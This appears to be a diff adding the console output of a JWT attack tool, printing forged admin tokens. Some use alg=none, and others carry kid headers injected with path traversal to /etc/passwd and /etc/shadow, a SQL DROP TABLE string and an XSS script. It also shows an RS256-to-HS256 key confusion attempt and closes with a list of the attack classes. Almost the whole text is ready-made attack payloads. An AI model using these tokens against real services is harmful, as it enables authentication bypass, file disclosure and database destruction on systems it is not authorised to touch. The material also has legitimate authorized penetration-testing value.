@@ -1,0 +1,54 @@
+[*] ALG=none Token:
+ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.============================================================[*] KID Injection Attack Vectors:
+----------------------------------------
+[*] JWT with KID '../../../../etc/passwd':
+eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.YZn7ujp9GxlkrUMEn2H5iOZMWgSp7_1PNtfkKB32c1A[*] JWT with KID '../../../../etc/shadow':
+eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9zaGFkb3ciLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.bCPlgXGIA2G9mF3nIHBZIveYhZzlmPLVzzfAPu5ED4U[*] JWT with KID '../../../windows/system32/drivers/etc/hosts':
+eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL3dpbmRvd3Mvc3lzdGVtMzIvZHJpdmVycy9ldGMvaG9zdHMiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.2kDAqqdg2k5dIb4bu7Fsbr3UJsMUylTh4wXXqrPPFMQ
+
+[*] JWT with KID '/dev/null':
+eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.b1tXhuFQMh54_dtUgv1OP9sHw4gDbDWwxDJn5Emnl1M
+
+[*] JWT with KID 'nonexistent_key_file':
+eyJhbGciOiJIUzI1NiIsImtpZCI6Im5vbmV4aXN0ZW50X2tleV9maWxlIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.7i_yYPQMS31lxEgNyvYnzSJOqDiQft2J_sT-G5YJtAk
+
+
+[*] Additional KID Manipulation Examples:
+----------------------------------------
+[*] JWT with KID '':
+eyJhbGciOiJIUzI1NiIsImtpZCI6IiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.jB04IyKRBafyge7NwS5Cz30brANLtiBGVGq_ue0bpVA
+
+[*] JWT with KID '0':
+eyJhbGciOiJIUzI1NiIsImtpZCI6IjAiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.w5j2lCQSCvCsJk-gjNEuGIDsSfBXeuuL-QP0jyMLMqI
+
+[*] JWT with KID '../key':
+eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL2tleSIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.BSyDk4seJEYPT6be3IuGd9AEH-3QvTnpfZcLatvgBAo
+
+[*] JWT with KID 'key.txt':
+eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleS50eHQiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.Wqv_6wcn3_LR67FA4GDVrbbO0qnp3ZfwvYUlF2hK-Ww
+
+[*] JWT with KID 'sql'; DROP TABLE users; --':
+eyJhbGciOiJIUzI1NiIsImtpZCI6InNxbCc7IERST1AgVEFCTEUgdXNlcnM7IC0tIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.O1VCAD9WXBu3njPq3PRMJYzU4Vxzdsxcl1TP3_8tIpM
+
+[*] JWT with KID '<script>alert('xss')</script>':
+eyJhbGciOiJIUzI1NiIsImtpZCI6IjxzY3JpcHQ-YWxlcnQoJ3hzcycpPC9zY3JpcHQ-IiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.bP7J5lpGKA4O8e-HZMIqifl8F7x7WK6MYrODgHa4_jU
+
+
+[*] Decoding example token to show structure:
+----------------------------------------
+[*] Decoded payload: {'user': 'admin', 'role': 'admin'}
+[*] Header: {'alg': 'none', 'typ': 'JWT'}
+
+[*] RS256 to HS256 Confusion Attack Example:
+----------------------------------------
+[!] RS256->HS256 example failed (expected): The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
+[*] This would work with a real RSA public key from the target server
+
+[*] Attack Summary:
+----------------------------------------
+1. ALG=none: Removes signature verification entirely
+2. KID Injection: Manipulates key file paths for LFI
+3. RS256->HS256: Forces asymmetric key to be used as symmetric secret
+4. Nonexistent KID: Tests fallback key handling
+
+[!] Use only in authorized penetration tests!
